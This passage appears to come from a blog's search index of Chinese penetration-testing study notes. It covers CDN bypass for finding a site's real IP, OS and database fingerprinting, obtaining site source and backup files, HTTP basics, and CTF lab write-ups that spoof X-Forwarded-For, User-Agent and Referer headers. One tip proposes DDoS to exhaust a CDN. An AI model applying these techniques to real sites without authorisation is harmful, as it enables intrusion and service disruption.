：根据对方邮件服务器给自己发送的邮件来判断对方邮件服务器的地址，这个地址可能就是网站服务器地址，或者反推主站服务器IP。邮件源码测试对比第三方查询（地区分析）\n3.国外地址请求：由于国外一般不设置CDN，所以使用国外地址请求国内服务器大概率会获取到真实IP。\n4.遗留文件，扫描全网：遗留文件类似于phpinfo.php文件（php配置文件）可能会有真实IP；扫描全网就是对全世界的网络进行响应，通过返回的IP地址进行搜集整理，再从这些IP中分析那个是真实IP；这是由于不是所有地区都有CDN，可能分析出的IP就是真实IP\n5.黑暗引擎搜索特定文件：傻蛋，钟馗之眼，fofa\n6.dns 历史记录，以量打量：查询DNS记录获取真实IP；以量打量，通过DDOS攻击使CDN上的流量耗尽，再访问就会访问到真实网站IP。这是由于CDN也是使用流量，其流量也会使用殆尽\n利用子域名请求获取真实 IP子域名小技巧：\n网站在设置的时候主站一般会设置成：\n*域名.com和www.域名.com\n这时当你在浏览器访问的时候不管你加不加www.都会解析出网站；\n而网站使用CDN节点时，若CDN节点只针对www.域名.com进行了设置，就会有多个IP，此时若查询域名.com就会查询到主站IP。(主要由于网站解析设置和在浏览器解析时会出现)\n###利用国外地址请求获取真实 IP\n使用该网站：https://asm.ca.com/en/ping.php\n网站地址shodan：https://www.shodan.io/\n超级Ping：http://ping.chinaz.com/\n第三方查询：https://www.get-site-ip.com/\n​                       https://asm.ca.com/en/ping.php\n​                       https://wepcc.com/\n全球CDN服务查询：http://tools.ipip.net/cdn.php\n查询DNS解析记录：https://securitytrails.com/\n​                                   https://dnsdb.io/zh-cn/\n","slug":"CDN绕过技术","date":"2022-01-28T02:50:43.000Z","categories_index":"基础知识","tags_index":"信息搜集,基础知识","author_index":"Aurora"},{"id":"522a77ecd65e851625388b054b8fcee7","title":"加密编码算法","content":"[TOC]\n前言在渗透测试中，常见的密码等敏感信息会采用加密处理，其中作为安全测试人员必须要了解常见的加密方式，才能为后续的安全测试做好准备。\n###常见加密编码等算法\nMD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES 等\n\nMD5解密不是从密文直接解密到明文，平台通过提交的密文与平台原来已经跑出来的密文进行对比，如果相匹配，则将已经用跑出来的密文对应的明文呈现给用户。（不是逆向解密）\nUnescape编码判断：%u+4个数字\n\nAES加密方式，输出是使用Base64格式&#x2F;Hex格式；则，若遇到Base64格式&#x2F;Hex格式解密得到的是乱码，应该往AES加密方式去想。\nAES解密的话，必须要知道密码和偏移量。\n\n常见加密形式算法直接加密，带 salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等\n常见解密方式（针对）枚举，自定义逆向算法，可逆向\n常规加密算法的特性长度位数，字符规律，代码分析，搜索获取等\n###某 CMS 密码加密解密\nMD5+salt格式：md5(md5($pass)$salt);\n这样的加密方式：\n是先对密码进行了md5加密：md5($pass)，而md5长度16位和32位都有可能并且又加了salt，可能性很多，基本无解；\n再进行了md5加密，相当于两次md5加密。\n（如果拿不到salt或其他的信息，无解）\n在安全测试过程中，遇到解密的时候，一定要清楚其是什么加密算法，什么加密方法，再想其解密方法。\n某实际应用 URL 地址参数加密搜索特定关键字加密字符串\n例如：国外的网站，SQL注入时候涉及加解密问题，如果直接使用工具去注入，工具不懂加解密，肯定会注入有问题。（谷歌连接国外的网站超时，图没截到，文字描述了）\n知识点的扩展程度是测试深度的前提。\n其他资源CMD5网站地址：https://www.cmd5.com/\n在线加解密工具：http://tool.chacuo.net/cryptaes\n","slug":"加密编码算法","date":"2022-01-27T13:21:21.000Z","categories_index":"基础知识","tags_index":"基础知识","author_index":"Aurora"},{"id":"20534c188994e1c78d0460ada7283d87","title":"系统及数据库","content":"[TOC]\n前言除去搭建平台中间件，网站源码外，容易受到攻击的还有操作系统，数据库等，第三方软件平台等，其中此类攻击也能直接影响到WEB或 服务器的安全，导致网站或服务器权限的获取。\n\n操作系统层面识别操作系统常见方法：\n如过对方有网站，可以通过网站识别；如果没网站，就通过一些工具的扫描识别；\n从网站上判断：window系统一般情况不区分大小写；Linux系统区别大小写。\n通过TTL值判断：默认系统的TTL（不是很准确）\n  1、WINDOWS NT&#x2F;2000  TTL：128\n  2、WINDOWS 95&#x2F;98   TTL：32\n  3、UNIX        TTL：255\n  4、LINUX       TTL：64\n  5、WIN7      TTL：64\n通过Nmap判断操作系统：Nmap在探测操作系统使用-O选项可启用操作系统探测。\n识别操作系统的意义：\nwindows和linux在某些漏洞执行方面会不同，测试时候可能会出现问题，因此需要判断是在什么系统上产生的漏洞。\n数据库层面如何识别数据库类型：\n1.通过网站识别数据库（脚本连接的数据库）：\nASP+Access（只能在windows平台）\nPHP+mysql\naspx+mssql &#x2F; sql server（只能在windows平台）\njsp+mssql &#x2F; sql server &#x2F; mysql &#x2F; oracle\npython+mysql(少)&#x2F; PostgreSQL &#x2F;oracle &#x2F; MongDB\n……\n2.通过端口扫描判断数据库类型：\nAccess端口：无端口\nmysql端口：3306\nmssql端口：1433\noracle端口：1521\nMongDB端口：27017\nRedis默认端口：6379\nPostgreSQL默认端口：5432\n……\n数据库类型识别意义： \n数据库不同，结构不同，产生的漏洞不同，不同的数据库攻击方法不同。\n数据库常见攻击：\n弱口令；漏洞\n数据库层面漏洞影响：\n获取到数据库权限；获取到网站权限。\n第三方层面常见第三方平台或软件见上图。\n漏洞类型及攻击：弱口令攻击；漏洞攻击等。\n第三方平台或软件安全测试危害：直接影响权限。\n###补充：除去常规WEB安全及APP安全测试外，类似服务器单一或复杂的其他服务(邮件、游戏、负载均衡等)也可以作为安全测试目标，此类目标测试原则只是少了WEB应用或其他安全问题。所以明确安全测试思路是很重要的！\n","slug":"系统及数据库","date":"2022-01-26T11:09:57.000Z","categories_index":"基础知识","tags_index":"基础知识","author_index":"Aurora"},{"id":"d5313f2d727d7eb1e40fe747a518af13","title":"WEB源码拓展","content":"[TOC]\n##前言\n​      WEB 源码在安全测试中是非常重要的信息来源，可以用来代码审 计漏洞也可以用来做信息突破口，其中 WEB 源码有很多技术需要简明分析。 比如：获取某 ASP 源码后可以采用默认数据库下载为突破，获取某其他脚本 源码漏洞可以进行代码审计挖掘或分析其业务逻辑等，总之源码的获取将为 后期的安全测试提供了更多的思路。\n知识点关于 WEB 源码目录结构 ：后台目录，模版目录，数据库目录\t\n关于 WEB 源码脚本类型 ：ASP,PHP,ASPX,JSP,JAVAWEB 等脚本类型源码安全问题\n关于 WEB 源码应用分类：社交，论坛，门户，第三方，博客等不同的代码机制对应漏洞\n关于 WEB 源码其他说明：开源，未开源问题，框架非框架问题，关于 CMS 识别问题及后续\n\n框架非框架：             \n若对方网站采用框架开发的话，找框架漏洞，而不是找其代码漏洞；若是非框架的话，找其代码漏洞；\nCMS识别：\n如果找漏洞找不到，自己分析；若是已经找到的话就在网上找别人分析的漏洞进行攻击；\nCMS的开源或内部：开源–直接找漏洞或审计\n内部–常规渗透测试\n由此，渗透常规思路：拿到一个网站的时候：\n1.判断是否是CMS\n2.CMS分开源和内部，开源的话自己挖漏洞或搜漏洞；内部的话，进行黑盒测试一步一步找漏洞\n源码获取：\n1.可以扫描其备份文件，网站为了防止东西遗失，一般都会将网站源码或数据库文件进行相关备份，有时候就能通过扫描工具进行探针到备份文件进行源码下载；\n2.通过CMS识别技术得到对方的名字在网上下载其源码；\n3.特定源码特定渠道，针对违法类的网站，这种网站不会采用网上公开的大众化的源码；这种情况只能按照特定的渠道获取其源码。\n关于源码获取的相关途径：搜索，闲鱼淘宝，第三方源码站，各种行业对应\n数据库配置文件 ：\n若可以得到数据库配置文件，可知其网站连接数据库的账号密码，则可从数据库中得其管理员的账号密码，直接登录其后台，得到相应的数据。\n\n图片来源：https://blog.csdn.net/m0_55227191/article/details/116804100\n总结：关注应用分类及脚本类型估摸出可能存在的漏洞（其中框架类例外），在获取源码后可进行本地安全测试或代码审计，也可以分析其目录工作原理（数据库备份，bak 文件等），未获取到的源码采用各种方法想 办法获取！\nASP源码下的一些特点ASP网站中特有的文件：xycms.mdb（mdb后缀，数据库文件）。\n​      ·根据其网站特性可以下载其数据库文件，再找到后台文件，然后访问后台。\n简要目标从识别到源码获取1.人工爆框架-搜索特定 url-获取其他相符站点-漏洞测试 \n2.借助特定行业源码或咸鱼进行搜索获取-本地搭建-代码审计或其他\n涉及学习网站Web安全学习笔记：https://websec.readthedocs.io/zh/latest/language/index.html\nCMS识别网站：http://whatweb.bugscaner.com/\n​                           https://www.yunsee.cn/\nCMS指纹库：https://github.com/Lucifer1993/cmsprint\n雨苁Blog：https://www.ddosi.org/\nGithub监控器：https://github.com/M4tir/Github-Monitor\n","slug":"WEB源码拓展","date":"2022-01-25T14:01:45.000Z","categories_index":"基础知识","tags_index":"基础知识","author_index":"Aurora"},{"id":"4a072225e90c93d078c9522dadc7362a","title":"搭建安全拓展","content":"[TOC]\n知识点常见搭建平台脚本启用\n域名 IP 目录解析安全问题 \n常见文件后缀解析对应安全 \n常见安全测试中的安全防护 \nWEB 后门与用户及文件权限\n\n1.ASP,PHP,ASPX,JSP,PY,JAVAWEB 等环境 \n2.WEB 源码中敏感文件 后台路径，数据库配置文件，备份文件等 \n3.IP 或域名解析 WEB 源码目录对应下的存在的安全问题 域名访问，IP 访问（结合类似备份文件目录）\n4.脚本后缀对应解析（其他格式可相同-上传安全）\n5.存在下载或为解析问题 \n6.常见防护中的 IP 验证，域名验证等 \n7.后门是否给予执行权限 \n8.后门是否给予操作目录或文件权限 \n9.后门是否给予其他用户权限\n\nIP访问网站和域名访问网站的区别搭建好的一个网站，如果使用IP去访问，会访问到其根目录，使用域名访问，指向其根目录下的一个文件。\n","slug":"搭建安全拓展","date":"2022-01-24T13:36:09.000Z","categories_index":"基础知识","tags_index":"基础知识","author_index":"Aurora"},{"id":"383f41268e6540fac61ee779bce8168d","title":"墨者学院-投票系统程序设计缺陷分析","content":"[TOC]\n0x00启动靶场进入靶场的投票页面：\n\n\n页面提示每个IP每天只限投一次票\n0x01先抓个包看看：\n为ggg投完票后显示id&#x3D;7，且返回结果0；\n再给ggg投票抓包看结果：\n\n结果返回-1，并提示投票机会用完\n0x02根据提示信息：\n\n应该是利用X-Forwarded-For伪造IP进行投票\n0x03重新抓包随便构造IP\n\n标注一下：\n这步我自己其实耗费了很长时间，知道怎么去爆破，但遗漏了一个知识点，导致花费了很长时间才完成，如下：\nRequest请求数据包格式：\n1.请求行：请求类型&#x2F;请求资源路径、协议的版本和类型\n2.请求头：一些键值对，浏览器与 web 服务器之间都可以发送，特定的某种含义\n3**.空行**：请求头与请求体之间用一个空行隔开\n4.请求体：要发送的数据(一般 post 提交会使用)；例：user&#x3D;123&amp;pass&#x3D;123\n由下图可知请求数据包的最后一个字段是请求体并且是POST方式，请求体上一行有一行空格，导致我爆破的时候，将XFF放在了空行的位置上，导致爆破的时候一直返回无效的HTTP请求。最后才发现数据包的格式错误。请求体上一行的一定是空行，什么都不能填\n之后在BP中的Intruder中选择爆破类型，选择爆破参数，这里的爆破参数为网段位和主机位\n（只要票数得了第一就好，爆破参数随便几位）\n\n0x04之后BP中 的Payloads中修改Payload set和Payload type，类型一定是Numbers，然后这里我设置的是从1到200，每次增加1票\n\n\n0x05如图爆破的每个数据回应包都返回是0，而上面抓包可知重复IP投票返回的结果是-1，则证明投票成功。\n\n0x06最后返回投票页面刷新页面得到KEY\n\n\n完成靶场。\n","slug":"墨者学院-投票系统程序设计缺陷分析","date":"2022-01-24T05:39:13.000Z","categories_index":"靶场","tags_index":"CTF,靶场","author_index":"Aurora"},{"id":"abc9d3adbc1e88211294230cb4be2455","title":"墨者学院-HTTP动作练习","content":"[TOC]\n0x00首先启动靶场\n\n\n返回结果是由于请求的URL太长，给的提示也是url这么长，GET合适么？说明请求的方式是GET\n0x01先抓个包验证一下是不是GET方式\n\n由包来看确实是GET方式，并且内容很多\n0x02由于HTTP中GET请求方式和POST请求方式两者有区别，并且提示使用POST方式提交\n\n0x03那就改成POST请求方式提交内容，在BP里改成POST方式，如图：\n右键点击Change request method\n\n改完之后的包：\n\n这里最重要的就是GET请求有长度限制，而POST请求没有长度限制。\n0x04提交之后得到KEY\n\n0x05\n完成靶场。\n##0x06\nGET和POST两种请求方式的区别：\nGET：\n使用 GET 方法时，查询字符串（名称或键值对）是在 GET 请求的 URL 中发送的：\n\nGET 请求可被缓存\nGET 请求保留在浏览器历史记录中\nGET 请求的URL可被收藏为书签\nGET 请求不应在处理敏感数据时使用\nGET 请求有长度限制\nGET 请求只应当用于获取数据\n\nGET 方法是默认的从浏览器向 Web 服务器传递信息的请求方法，它会产生一个很长的字符串，出现在浏览器的地址栏中。GET 方法有大小限制：请求字符串中最多只能有 1024 个字符。\nPOST：\n使用POST方法时，查询字符串（名称或键值对）是在POST请求的HTTP消息主体重发送的：使用 doGet()方法处理这种类型的请求。\n\nPOST 请求不会被缓存\nPOST 请求不会保留在浏览器历史记录中\nPOST请求的URL不能被收藏为书签\nPOST 请求没有长度要求\n\nHTTP的方法中POST向后台传输数据比较可靠，POST 方法打包信息的方式与 GET 方法基本相同，但是 POST 方法不是把信息作为 URL 中 ?  字符后的文本字符串进行发送，而是把这些信息作为一个单独的消息进行发送。Servlet 使用 doPost() 方法处理这种类型的请求。\n\n在浏览器进行回退操作时，GET 请求是无害的，而 POST 请求则会重新请求一次\n\nGET 请求参数是连接在 URL 后面的,而POST请求参数是存放在消息主体（Requestbody）内\n\nGET 请求因为浏览器对 url 长度有限制（不同浏览器长度限制不一样）对传参数量有限制，而 post 请求因为参数存放 Requestbody 内所以参数数量没有限制 \n\n因为 GET 请求参数暴露在URL上,所以安全方面 POST 比 GET 更加安全\n\nGET 请求浏览器会主动缓存（Cache），POST 并不会，除非主动设置\n\nGET 请求参数会保存在浏览器历史记录内，POST 请求并不会\n\nGET 请求只能进行 URL 编码，而 POST 请求可以支持多种编码方式\n\nGET 请求产生1个 Tcp 数据包，POST 请求产生2个 Tcp 数据包\n\n浏览器在发送 GET 请求时会将请求头（Header）和数据（Data）一起发送给服务器，服务器返回200状态码，而在发送 POST 请求时，会先将 Header 发送给服务器，服务器返回100，之后再将 Data 发送给服务器，服务器返回200\n（文本来源于w3cschool）\n\n\n","slug":"墨者学院-HTTP动作练习","date":"2022-01-24T04:51:02.000Z","categories_index":"靶场","tags_index":"CTF,靶场","author_index":"Aurora"},{"id":"39baee024bf244e39dfc48c40929c4eb","title":"墨者学院-浏览器信息伪造","content":"[TOC]\n0x00启动靶场后显示\n\n0x01点击”这是微信最好的状态：……”后\n\n提示使用苹果手机的2G网络进行访问\n0x02不管什么东西，先抓个包看看\n\n正是刚才提示的页面数据包\n0x03由于提示使用苹果手机访问，先利用BurpSuit修改iPone访问的包，由于还得是2G网络，\n\n再接着分析解题方向还得有NetType，去网上找找这个字段\n\n在网上找到了浏览器类型并且附带NetType&#x2F;2G的字段，直接复制粘贴可好\n0x04修改包的内容：\n将包里的User-Agent字段修改为以下内容：\n\n得到KEY。\n0x05至此，浏览器信息伪造完成\n\n","slug":"墨者学院-浏览器信息伪造","date":"2022-01-24T03:16:41.000Z","categories_index":"靶场","tags_index":"CTF,靶场","author_index":"Aurora"},{"id":"495216adb2265f60982c64eb2dfe8dfd","title":"墨者学院-来源页伪造","content":"[TOC]\n0x00首先启动靶场\n\n0x01进入靶场后表示只能使用google浏览器访问\n\n0x02首先想到不可能每次都使用Google访问，解题提示使用referer构造google访问的请求数据包\n利用Burpsuite进项伪造\n二话不说先抓个包\n\n接下来伪造Google访问数据包\n\n将Referer: http://219.153.49.228:42036/index.html替换成Referer: http://google.com\n得到KEY。\n0x03\n完成来源页伪造。\n","slug":"墨者学院-来源页伪造","date":"2022-01-24T02:45:11.000Z","categories_index":"靶场","tags_index":"CTF,靶场","author_index":"Aurora"},{"id":"2fe6b220dcca97cedb2f7f37b2f387f3","title":"数据包拓展","content":"[TOC]\n代理当从浏览器访问时，使用代理(Proxy)可以抓取请求数据包(Request)进行分析，或者从Web Server返回数据包(Response)进行分析；BurpSuit其实就很典型，可以作为代理服务器，实现上述作用。\nHttp和Httpshttp包抓到后一般都是明文的，https通常是密文的，加密的。\nhttp简要通信过程：\n1.浏览器建立与web服务器之间的连接\n2.浏览器将请求数据打包（生成请求数据包）并发送到web服务器\n3.web服务器将处理结果打包（生成响应数据包）并发送给浏览器\n4.web服务器关闭连接\nhttps简要通信过程\n1.https请求\n2.服务器响应\n3.证书校验，生成密码，公钥加密\n4.加密信息\n5.私钥解密，解密握手 消息，验证HASH\n6.加密信息\n7.解密握手消息，验证HASH\n8.正常加密通信\nRequest请求数据包格式1.请求行：请求类型&#x2F;请求资源路径、协议的版本和类型\n 2.请求头：一些键值对，浏览器与 web 服务器之间都可以发送，特定的某种含义\n3.空行：请求头与请求体之间用一个空行隔开\n 4.请求体：要发送的数据(一般 post 提交会使用)；例：user&#x3D;123&amp;pass&#x3D;123\n###请求行\n请求行由三个标记组成：请求方法、请求 URL 和 HTTP 版本，它们用空格分享。 \n例如：\nGET &#x2F;index.html HTTP&#x2F;1.1 HTTP 规划定义了 8 种可能的请求方法：\n GET：检索 URL 中标识资源的一个简单请求\n HEAD：与 GET 方法相同，服务器只返回状态行和头标，并不返回请求文档 \nPOST：服务器接受被写入客户端输出流中的数据的请求\n PUT：服务器保存请求数据作为指定 URL 新内容的请求\n DELETE：服务器删除 URL 中命令的资源的请求 \nOPTIONS：关于服务器支持的请求方法信息的请求 \nTRACE：web 服务器反馈 Http 请求和其头标的请求 \nCONNECT ：已文档化，但当前未实现的一个方法，预留做隧道处理\n请求头由关键字&#x2F;值对组成，每行一对，关键字和值用冒号分享。请求头标通知服务器腾于客户端的功能和标识。 \nHOST: 主机或域名地址 \nAccept：指浏览器或其他客户可以接爱的 MIME 文件格式。\nServlet 可以根据它判断并返回适当的文件格 式。\n User-Agent：是客户浏览器名称\nHost：对应网址 URL 中的 Web 名称和端口号。 \nAccept-Langeuage：指出浏览器可以接受的语言种类，如 en 或 en-us，指英语。 \nconnection：用来告诉服务器是否可以维持固定的 HTTP 连接。http 是无连接的，HTTP&#x2F;1.1 使用 Keep-Alive 为默认值，这样，当浏览器需要多个文件时(比如一个 HTML 文件和相关的图形文件)，不需要每次都建立 连接\n Cookie：浏览器用这个属性向服务器发送 Cookie。Cookie 是在浏览器中寄存的小型数据体，它可以记载 和服务器相关的用户信息，也可以用来实现会话功能。 \nReferer ： 表 明 产 生 请 求 的 网 页 URL 。 如 比 从 网 页 &#x2F;icconcept&#x2F;index.jsp 中 点 击 一 个 链 接 到 网 页 &#x2F;icwork&#x2F;search ， 在 向 服 务 器 发 送 的 GET&#x2F;icwork&#x2F;search 中 的 请 求 中 ， Referer 是 http://hostname:8080/icconcept/index.jsp。这个属性可以用来跟踪 Web 请求是从什么网站来的。\n Content-Type：用来表名 request 的内容类型。可以用 HttpServletRequest 的 getContentType()方法取得。 \nAccept-Charset：指出浏览器可以接受的字符编码。英文浏览器的默认值是 ISO-8859-1. Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加 速文件传递速度。浏览器在接收到 Web 响应之后先解码，然后再检查文件格式。\nX-Forwarded-For： 是一个 HTTP 扩展头部。HTTP&#x2F;1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP。\n X-Real-IP：这又是一个自定义头部字段。X-Real-IP 通常被 HTTP 代理用来表示与它产生 TCP 连接的设备 IP，这个设备可能是其他代理，也可能是真正的请求端。需要注意的是，X-Real-IP 目前并不属于任何标准，代理和 Web 应用之间可以约定用任何自定义头来传递这个信息。\n请求空行最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。\n用于分割POST请求的请求头，和请求体。\n请求数据使用 POST 传送，最常使用的是 Content-Type 和 Content-Length 头标。\n封装POST请求消息的请求参数。\nResponse返回数据包数据格式一个响应由四个部分组成；状态行、响应头标、空行、响应数据。\n1.状态行：协议版本、数字形式的状态代码和状态描述，个元素之间以空格分隔 \n2.响应头标：包含服务器类型、日期、长度、内容类型等 \n3.空行：响应头与响应体之间用空行隔开 \n4.响应数据：浏览器会将实体内容中的数据取出来，生成相应的页面\nHTTP 响应码：\n 1xx：信息，请求收到，继续处理\n 2xx：成功，行为被成功地接受、理解和采纳 \n3xx：重定向，为了完成请求，必须进一步执行的动作 \n4xx：客户端错误 \n5xx：服务器错误\n200  存在文件\n403  存在文件夹\n3xx  均可能存在\n404  不存在文件及文件夹 \n500  均可能存在\n","slug":"数据包拓展","date":"2022-01-23T10:36:42.000Z","categories_index":"基础知识","tags_index":"基础知识","author_index":"Aurora"},{"id":"ab68de4c111fbe65e54d3c2aa4caf914","title":"基础入门-概念名词","content":"[TOC]\n域名一、域名定义：就好比个人的名字，网站基本都有域名，网站地址名称。通俗点其实就是URL。\n百度官方解释：\n域名（英语：Domain Name），又称网域，是由一串用点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时对计算机的定位标识（有时也指地理位置）。\n由于IP地址具有不方便记忆并且不能显示地址组织的名称和性质等缺点，人们设计出了域名，并通过网域名称系统（DNS，Domain Name System）来将域名和IP地址相互映射，使人更方便地访问互联网，而不用去记住能够被机器直接读取的IP地址数串。\n二、域名级别不同\n1、带WWW的域名：带WWW的域名的域名级别可以是一级域名，也可以是二级域名。\n2、不带WWW的域名：不带WWW的域名级别一定是一级域名。\n三、域名解析不同\n1、带WWW的域名：带WWW的域名的不能直接进行域名解析，需要重定向才可域名解析。\n2、不带WWW的域名：不带WWW的域名可以直接进行域名解析。\n四、域名发现对于安全测试意义：\n（www.称为主站）多级域名的收集在测试时候会多一种可能性，\n主站找不到突破口，就到主站下面的多级域名站中找突破口，如果在多级域名站中找到突破口获得一定权限，就可以在主站中获得一定权限。\nDNS一、DNS定义：主要用于域名与IP地址的相互转换。\n域名系统（英文：Domain Name System，缩写：DNS）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。\n二、DNS宇本地host文件的关系：\n网站在解析IP地址的时候，当去ping此网站的时候，网站先会去本地的host文件中去看一下有没有这个域名所对应的IP地址，如果有，则解析host文件中的IP地址 ，如果没有，则去互联网上的DNS服务器上去解析域名所对应的IP地址。\n（此方法可以使访问者访问你想要让访问者访问的IP地址）\nCDNCDN:缓存节点技术\nCDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。\n百度图片：\n\nCDN与DNS的关系：\nCDN实际上是一个就近访问，那么现在有一个问题是，我们怎么知道用户的所在位置从而给他分配最佳的CDN节点呢。这就需要DNS服务来进行定位了。当我们通过使用DNS服务的时候，可以根据他使用的LDNS服务器来进行一个定位，例如我们的调度服务器看到他是来自深圳电信的LDNS服务器，那么我们就认为该用户来自深圳电信，然后调度服务器可以让该用户去访问深圳电信的CDN服务器，这样就让用户访问到了最优的CDN节点。\n 通过DNS服务我们可以很快的定位到用户的位置，然后给用户分配最佳CDN节点，但是这种调度方式存在一个问题，例如，当我 是北京联通的用户但是使用的却是深圳电信的LDNS的话，调度服务器会给我分配到深圳电信的CDN服务器，这样就产生了错误的调度。\n常见的DNS安全攻击：缓存投毒：\n通常也称为域名系统投毒或DNS缓存投毒。它是利用虚假Internet地址替换掉域名系统表中的地址，进而制造破坏。当网络用户在带有该虚假地址的页面中进行搜寻，以访问某链接时，网页浏览器由于受到该虚假条目的影响而打开了不同的网页链接。在这种情况下，蠕虫、木马、浏览器劫持等恶意软件就可能会被下载到本地用户的电脑上\nDNS劫持：\nDNS劫持又称域名劫持，是指在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则返回假的IP地址或者什么都不做使请求失去响应，其效果就是对特定的网络不能访问或访问的是假网址。这类攻击一般通过恶意软件来更改终端用户TCP&#x2F;IP设置，将用户指向恶意DNS服务器，该DNS服务器会对域名进行解析，并最终指向钓鱼网站等被攻击者操控的服务器\n域名劫持：\n域名劫持就是在劫持的网络范围内拦截域名解析的请求，分析请求的域名，把审查范围以外的请求放行，否则直接返回假的IP地址或者什么也不做使得请求失去响应，其效果就是对特定的网址不能访问或访问的是假网址。一旦您的域名被劫持，用户被引到假冒的网站进而无法正常浏览网页，用户可能被诱骗到冒牌网站进行登录等操作导致泄露隐私数据。\nDNS DDoS攻击：\n针对DNS的DDoS攻击通过控制大批僵尸网络利用真实DNS协议栈发起大量域名查询请求，利用工具软件伪造源IP发送海量DNS查询，发送海量DNS查询报文导致网络带宽耗尽而无法传送正常DNS查询请求。发送大量非法域名查询报文引起DNS服务器持续进行迭代查询，从而达到较少的攻击流量消耗大量服务器资源的目的\n反射式DNS放大攻击：\n所有放大攻击都利用了攻击者和目标Web资源之间的带宽消耗差异，由于每个机器人都要求使用欺骗性IP地址打开DNS解析器，该IP地址已更改为目标受害者的真实源IP地址，然后目标会从DNS解析器接收响应。为了创建大量流量，攻击者以尽可能从DNS解析器生成响应的方式构造请求。结果，目标接收到攻击者初始流量的放大，并且他们的网络被虚假流量阻塞，导致拒绝服务。\n脚本语言一、常见脚本语言类型：\nasp php aspx jsp javaweb pl py cgi等\n二、不同脚本类型与安全漏洞的关系：\n由于写网站的源码不同，则所用语言类型也不同，这时就需要掌握各种所写网站的脚本语言去看懂代码挖掘漏洞。\n三、漏洞挖掘代码审计与脚本类型的关系：\n想要找到漏洞，首先就得看懂网站代码，这就是粗略的代码审计，在这之前一定要自己先掌握各种写网站的语言。\n后门一、什么是后门：攻击者测试或者非法入侵的过程中遗留的后门文件，便于下次进行操作，一般拿到权限后会遗留后门\n二、有哪些后门：（后门只是一个统称，类型很多）网站后门，服务器后门\n三、后门在安全测试中的实际意义：\n\n方便下次进来\n相当于一个管道，获取一定权限后连接的通道\n\n免杀：遗留下的后门不被检测到\nWeb一、web的组成架构模型：\n\n网站源码：分脚本类型 分应用方向\n操作系统：windows linux\n中间件（搭建平台）：apache iis tomcat nginx等\n数据库：access mysql mssql sqlserver oracle sybase db2 postsql等\n\n二、Web相关漏洞 ：\n1.Web源码类对应漏洞：\n2.Sql注入，文件上传，XSS，代码执行，变量覆盖，逻辑漏洞，反序列化等\n3.Web中间件对应漏洞\n4.Web数据库对应漏洞\n5.Web系统层对应漏洞\n6.其他第三方对应漏洞\nAPP或PC应用结合类\n有些app打开和pc端打开后的网站一模一样，两者没什么区别，核心都是网站\nApp也是通过各种协议传输数据\n","slug":"基础入门-概念名词","date":"2022-01-22T10:29:49.000Z","categories_index":"基础知识","tags_index":"基础知识","author_index":"Aurora"}]